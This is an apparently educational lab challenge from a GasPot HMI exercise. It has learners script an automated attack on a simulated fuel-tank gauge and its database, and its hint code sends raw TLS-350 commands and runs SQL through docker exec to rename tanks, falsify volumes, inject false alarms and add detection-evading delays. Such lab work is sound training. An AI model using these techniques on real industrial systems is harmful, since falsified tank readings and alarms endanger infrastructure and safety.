# Challenge 1: Automated Attack Script

## The Challenge

You've manually executed attacks against the ATG and database. Now write a Python script that automates the entire attack chain.

This is the kind of tool a real attacker might develop for rapid deployment across multiple targets.

---

## Requirements

Your script should:

1. **Enumerate** all tanks from the ATG
2. **Document** the current state (save baseline)
3. **Modify** all tank names to indicate compromise
4. **Manipulate** volume readings
5. **Inject** false alarms into the database
6. **Log** all actions with timestamps

---

## Starter Code

Here's a skeleton to get you started:

```python
#!/usr/bin/env python3
"""
Automated ATG Attack Script
GasPot HMI Lab - Challenge Exercise
"""

import socket
import datetime
import sys

# Configuration
ATG_HOST = "localhost"
ATG_PORT = 10001
DB_CONTAINER = "gaspot-historian"
DB_USER = "lab"
DB_PASS = "password"
DB_NAME = "historian"

def log(message):
    """Log with timestamp"""
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{ts}] {message}")

def send_atg_command(command):
    """Send a TLS-350 command and return response"""
    # TODO: Implement this
    # Remember: prefix with 0x01, suffix with newline
    # Handle the response (look for ETX 0x03)
    pass

def get_inventory():
    """Get current tank inventory"""
    # TODO: Implement this
    pass

def set_tank_name(tank_id, name):
    """Change a tank's name"""
    # TODO: Implement this
    pass

def set_tank_volume(tank_id, volume):
    """Change a tank's volume"""
    # TODO: Implement this
    pass

def inject_alarm(tank_id, alarm_type, severity, message):
    """Inject a false alarm into the database"""
    # TODO: Implement this
    # Hint: Use subprocess to call docker exec with mysql command
    pass

def main():
    log("Starting automated attack")

    # Step 1: Enumerate
    log("Phase 1: Enumeration")
    # TODO: Get and save baseline

    # Step 2: Modify tank names
    log("Phase 2: Modifying tank names")
    # TODO: Change all tank names

    # Step 3: Manipulate volumes
    log("Phase 3: Manipulating volumes")
    # TODO: Set volumes to concerning values

    # Step 4: Inject alarms
    log("Phase 4: Injecting false alarms")
    # TODO: Insert critical alarms

    log("Attack complete")

if __name__ == "__main__":
    main()
```

---

## Hints

**ATG Communication**:
```python
def send_atg_command(command):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5.0)
        s.connect((ATG_HOST, ATG_PORT))
        s.sendall(b'\x01' + command.encode() + b'\n')
        response = b''
        while True:
            chunk = s.recv(4096)
            if not chunk or b'\x03' in chunk:
                response += chunk
                break
            response += chunk
        return response.decode('ascii', errors='replace')
```

**Database Commands**:
```python
import subprocess

def run_sql(query):
    cmd = [
        "docker", "exec", DB_CONTAINER,
        "mysql", "-u", DB_USER, f"-p{DB_PASS}", DB_NAME,
        "-e", query
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout
```

---

## Bonus Points

Extend your script to:

- Accept command-line arguments for target host/port
- Include a `--restore` option to undo changes
- Generate a JSON report of actions taken
- Add random delays to avoid detection
- Validate changes were successful after each step

---

## Testing

Run your script:
```bash
python3 your_attack_script.py
```

Verify the impact:
- Check the HMI dashboard
- Query the database for new alarms
- Run the ATG client to see modified values

Reset when done:
```bash
./scripts/reset_lab.sh && ./scripts/start_lab.sh
```

---

## What You'll Learn

- Socket programming for industrial protocols
- Automating attack workflows
- Combining multiple attack vectors programmatically
- Basic operational security (logging, timing)

---

## Notes

**Offensive Tool Development**: Security professionals sometimes build tools like this for authorized assessments. Always ensure you have written permission before using such tools.

**Detection Perspective**: As you build this, think about what artifacts it creates. How might defenders detect this script running?
